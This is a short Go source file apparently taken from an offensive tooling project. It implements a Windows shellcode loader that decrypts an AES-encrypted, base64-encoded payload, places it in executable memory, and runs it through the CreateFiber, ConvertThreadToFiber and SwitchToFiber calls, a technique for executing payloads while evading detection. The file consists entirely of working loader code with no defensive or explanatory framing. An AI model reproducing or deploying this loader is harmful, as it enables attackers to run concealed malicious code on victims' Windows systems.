package fibers_v1

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"syscall"
	"unsafe"
)

var (
	kernel32                 = syscall.NewLazyDLL("kernel32.dll")
	ntdll                    = syscall.NewLazyDLL("ntdll.dll")
	procCreateFiber          = kernel32.NewProc("CreateFiber")
	procConvertThreadToFiber = kernel32.NewProc("ConvertThreadToFiber")
	procSwitchToFiber        = kernel32.NewProc("SwitchToFiber")
	procGetLastError         = kernel32.NewProc("GetLastError")
	procVirtualAlloc         = kernel32.NewProc("VirtualAlloc")
	procRtlCopyMemory        = ntdll.NewProc("RtlCopyMemory")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

func ShellcodeFibers(Shellcode string, password string) {

	ciphertext, _ := base64.StdEncoding.DecodeString(Shellcode)
	key, _ := base64.StdEncoding.DecodeString(password)
	block, _ := aes.NewCipher(key)
	plaintext := make([]byte, len(ciphertext))
	stream := cipher.NewCTR(block, key[aes.BlockSize:])
	stream.XORKeyStream(plaintext, ciphertext)

	// Allocate executable memory for the shellcode
	shellcodeAddr, _, _ := procVirtualAlloc.Call(0, uintptr(len(plaintext)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if shellcodeAddr == 0 {
		lastError, _, _ := procGetLastError.Call()
		fmt.Printf("[!] VirtualAlloc Failed With Error: %d \n", lastError)
		return
	}

	// Copy the shellcode to the allocated memory
	_, _, _ = procRtlCopyMemory.Call(shellcodeAddr, (uintptr)(unsafe.Pointer(&plaintext[0])), uintptr(len(plaintext)))

	// Create a fiber to execute the shellcode
	shellcodeFiberAddress, _, _ := procCreateFiber.Call(0, shellcodeAddr, 0)
	if shellcodeFiberAddress == 0 {
		lastError, _, _ := procGetLastError.Call()
		fmt.Printf("[!] CreateFiber Failed With Error: %d \n", lastError)
		return
	}
	// Convert current thread to a fiber
	primaryFiberAddress, _, _ := procConvertThreadToFiber.Call(0)
	if primaryFiberAddress == 0 {
		lastError, _, _ := procGetLastError.Call()
		fmt.Printf("[!] ConvertThreadToFiber Failed With Error: %d \n", lastError)
		return
	}
	fmt.Printf("[+] Fiber Executed")
	// Switch to the shellcode fiber
	procSwitchToFiber.Call(shellcodeFiberAddress)
}
